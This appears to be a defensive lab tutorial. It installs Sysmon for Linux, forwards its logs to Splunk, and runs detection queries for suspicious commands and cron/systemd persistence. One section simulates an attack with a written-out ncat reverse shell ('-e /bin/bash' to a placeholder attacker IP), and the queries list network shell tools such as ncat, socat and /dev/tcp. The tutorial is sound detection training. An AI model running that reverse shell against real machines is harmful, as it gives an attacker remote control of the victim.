# Monitoring and Investigation of Suspicious Process Execution (Linux)

## Inputs Configuration for Splunk

```sh
nano /opt/splunkforwarder/etc/system/local/inputs.conf
```

```sh
[monitor:///var/log/sysmon.log]
index = linux_os_logs
sourcetype = sysmon
disabled = false
```

- Installation of **Sysmon for Linux** with an advanced XML configuration to detect multiple MITRE ATT&CK techniques.

## Install Sysmon for Linux

- [Sysmon for Linux](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

```sh
# Download Microsoft packages repo
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb

# Update package list
sudo apt-get update

# Install Sysmon for Linux
sudo apt-get install sysmonforlinux -y
```

## Configure Sysmon with Advanced Rules

#### Create the configuration file

```sh
nano sysmon-config.xml
```

## Paste the advanced XML configuration

- This configuration covers multiple `MITRE ATT&CK` techniques for `process creation, network connections, file creation, persistence, environment injection, and process termination`.

- [Recommended base config: MSTIC Sysmon Config](https://raw.githubusercontent.com/microsoft/MSTIC-Sysmon/main/linux/configs/main.xml)

- [https://github.com/thierno953/SOC_ANALYST/blob/main/Splunk_Ubuntu/sysmon-config.xml](https://github.com/thierno953/SOC_ANALYST/blob/main/Splunk_Ubuntu/sysmon-config.xml)

## Start Sysmon with the configuration

```sh
sudo sysmon -i /etc/sysmon-config.xml
sudo systemctl restart sysmon
sudo systemctl status sysmon

sudo sysmon -c /etc/sysmon-config.xml

sudo journalctl -u sysmon.service -f
```

## Simulate an Attack (Reverse Shell)

#### On attacker machine

```sh
sudo apt install ncat net-tools -y
sudo ncat -lnvp 4444 -k
```

#### On victim machine

```sh
sudo apt install ncat net-tools -y
ncat <IP_ATTACK_MACHINE> 4444 -e /bin/bash
```

#### Verify the connection

```sh
lsof -i :4444
netstat -tulnp | grep 4444
```

## Analysis in Splunk

#### a. All Sysmon logs:

```sh
index="linux_os_logs" process=sysmon
```

![Splunk](/Splunk_Ubuntu/assets/06.png)

#### b. Suspicious command execution:

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command
(ncat OR netcat OR "bash -i" OR curl OR wget OR "python -c" OR "perl -e" OR "php -r" OR socat OR "/dev/tcp" OR "chmod 777" OR scp)
```

![Splunk](/Splunk_Ubuntu/assets/07.png)

#### c. Command stats by host and time:

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command
| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
| stats count by host, command_executed, _time
| sort - count
```

![Splunk](/Splunk_Ubuntu/assets/08.png)

#### d. Timechart of suspicious commands:

```sh
index="linux_os_logs" process=sysmon TechniqueName=Command
| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)"
| timechart span=30m count by command_executed
```

![Splunk](/Splunk_Ubuntu/assets/09.png)

## Persistence monitoring (cron/systemd changes):

#### a. Cron and systemd events per host

```sh
index="linux_os_logs" process=sysmon
| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
| stats count by host, _raw, _time
| sort -_time
```

![Splunk](/Splunk_Ubuntu/assets/10.png)

#### b. Cron/systemd events aggregated hourly

```sh
index="linux_os_logs" process=sysmon
| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
| bin _time span=1h
| stats count by _time, host
| sort _time
```

![Splunk](/Splunk_Ubuntu/assets/11.png)

#### c. Timechart of cron/systemd events

```sh
index="linux_os_logs" process=sysmon
| where like(_raw, "%/etc/cron%") OR like(_raw, "%/etc/systemd/system%")
| timechart span=1h count by host
```

![Splunk](/Splunk_Ubuntu/assets/12.png)

#### d. Suspicious commands executed

```sh
index="linux_os_logs" process=sysmon
| rex field=_raw "(?i)(?P<command_executed>ncat|netcat|bash -i|curl|wget|python -c|perl -e|php -r|socat|/dev/tcp|chmod 777|scp)\s(?P<command_args>.*)"
| stats count by host, command_executed, command_args, _time
| sort -count
```

![Splunk](/Splunk_Ubuntu/assets/13.png)
